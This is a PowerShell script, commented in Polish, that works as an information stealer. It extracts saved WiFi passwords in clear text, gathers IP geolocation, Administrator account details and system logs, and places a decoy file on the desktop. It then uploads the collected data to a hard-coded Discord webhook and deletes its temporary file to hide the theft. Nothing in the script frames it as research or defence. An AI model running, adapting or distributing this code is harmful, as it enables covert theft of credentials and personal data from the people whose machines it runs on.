$n = "$env:TEMP\$env:UserName.txt"
$w = 'https://discord.com/api/webhooks/1361318439314128928/0ysFUO-d6BMEU4T7fQmlHVCAU2lK8-3gr-HgTDMOwu3QZ1ikm1_k9t9LAPMLM1IBg--z'

# 1. WiFi hasła
$wifi = (netsh wlan show profiles) | Select-String ':(.+)$' | ForEach-Object {
    $p = $_.Matches.Groups[1].Value.Trim()
    (netsh wlan show profile name="$p" key=clear) |
    Select-String 'Key Content.+:(.+)$' |
    ForEach-Object {
        $k = $_.Matches.Groups[1].Value.Trim()
        "$p : $k"
    }
}

# 2. IP i lokalizacja
try {
    $ipinfo = Invoke-RestMethod -Uri "https://ipinfo.io/json" -UseBasicParsing
    $ipText = @"
IP Info:
IP         : $($ipinfo.ip)
City       : $($ipinfo.city)
Region     : $($ipinfo.region)
Country    : $($ipinfo.country)
Org        : $($ipinfo.org)
"@
} catch {
    $ipText = "IP Info: Błąd pobierania"
}

# 3. Info o koncie Administrator
try {
    $adminInfo = net user Administrator
} catch {
    $adminInfo = "Brak dostępu do konta Administrator"
}

# 4. Logi systemowe
try {
    $logs = Get-EventLog -LogName System -Newest 20 | Out-String
} catch {
    $logs = "Brak dostępu do logów systemowych"
}

# 5. Złożenie wszystkich danych
$all = @()
$all += "=== WIFI HASŁA ==="
$all += $wifi
$all += "`n=== IP i Lokalizacja ==="
$all += $ipText
$all += "`n=== Administrator Info ==="
$all += $adminInfo
$all += "`n=== Logi Systemowe (ostatnie 20) ==="
$all += $logs

$all | Set-Content $n
Start-Sleep -Milliseconds 500

# 6. Utwórz plik na pulpicie
try {
    $desktop = [Environment]::GetFolderPath("Desktop")
    Set-Content -Path "$desktop\Paweł_Zbieć_Morfologia.txt" -Value " " -Force
} catch {
    "$($_.Exception.Message)" | Out-File "$env:TEMP\blad_pulpitu.txt"
}

# 7. Wysyłka do Discord webhook
$bd = [guid]::NewGuid().ToString()
$lf = "`r`n"
$h = @{ 'Content-Type' = "multipart/form-data; boundary=$bd" }
$c = Get-Content $n -Raw
$b = @(
    "--$bd",
    'Content-Disposition: form-data; name="file"; filename="' + $n + '"',
    'Content-Type: text/plain',
    '',
    $c,
    "--$bd--"
) -join $lf

$d = [System.Text.Encoding]::UTF8.GetBytes($b)
Invoke-RestMethod -Uri $w -Method POST -Headers $h -Body $d

# 8. Sprzątanie
Remove-Item $n -Force
